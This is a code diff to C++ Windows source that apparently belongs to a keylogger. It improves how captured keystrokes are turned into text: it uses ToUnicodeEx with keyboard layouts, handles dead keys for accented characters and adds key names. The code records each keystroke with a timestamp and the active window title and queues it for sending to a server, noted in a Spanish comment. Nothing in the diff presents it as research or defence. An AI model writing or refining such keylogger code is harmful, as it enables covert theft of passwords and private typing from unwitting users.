@@ -51,6 +51,8 @@ const std::map<int, std::string> keyname{
     {VK_LCONTROL,"[LCONTROL]"},
     {VK_RCONTROL,"[RCONTROL]"},
     {VK_MENU,    "[ALT]"},
+    {VK_LMENU,   "[LALT]"},
+    {VK_RMENU,   "[RALT]"},
     {VK_LWIN,    "[LWIN]"},
     {VK_RWIN,    "[RWIN]"},
     {VK_ESCAPE,  "[ESCAPE]"},
@@ -62,13 +64,9 @@ const std::map<int, std::string> keyname{
     {VK_DOWN,    "[DOWN]"},
     {VK_PRIOR,   "[PG_UP]"},
     {VK_NEXT,    "[PG_DOWN]"},
-    {VK_OEM_PERIOD, "."},
-    {VK_DECIMAL, "."},
-    {VK_OEM_PLUS, "+"},
-    {VK_OEM_MINUS,"-"},
-    {VK_ADD,     "+"},
-    {VK_SUBTRACT,"-"},
     {VK_CAPITAL, "[CAPSLOCK]"},
+    {VK_DELETE,  "[DELETE]"},
+    {VK_INSERT,  "[INSERT]"},
 };
 #endif
 
@@ -210,15 +208,29 @@ static std::string RenderKey(int key_stroke, HKL layout) {
     auto it = keyname.find(key_stroke);
     if (it != keyname.end()) return it->second;
 
-    bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-    if ((GetKeyState(VK_SHIFT)  & 0x1000) != 0 ||
-        (GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
-        (GetKeyState(VK_RSHIFT) & 0x1000) != 0) {
-        lowercase = !lowercase;
+    BYTE keyState[256] = {0};
+    GetKeyboardState(keyState);
+
+    UINT scanCode = MapVirtualKeyEx(key_stroke, MAPVK_VK_TO_VSC, layout);
+
+    wchar_t wbuf[8] = {0};
+    int result = ToUnicodeEx(key_stroke, scanCode, keyState, wbuf,
+                             sizeof(wbuf)/sizeof(wbuf[0]), 0, layout);
+
+    if (result > 0) {
+        char utf8[32] = {0};
+        int len = WideCharToMultiByte(CP_UTF8, 0, wbuf, result,
+                                       utf8, sizeof(utf8)-1, NULL, NULL);
+        if (len > 0) return std::string(utf8, len);
     }
-    char key = (char)MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
-    if (!lowercase) key = (char)tolower((unsigned char)key);
-    return std::string(1, key);
+
+    if (result == -1) {
+        // Dead key (tildes, acentos): no limpiar estado,
+        // la siguiente pulsacion producira el caracter combinado.
+        return "";
+    }
+
+    return "";
 #endif
 }
 
@@ -244,6 +256,7 @@ int Save(int key_stroke) {
     strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%S", &tm_info);
 
     std::string rendered = RenderKey(key_stroke, layout);
+    if (rendered.empty()) return 0;
 
     // Envio al servidor
     EnqueueKey(rendered, window_title, ts);
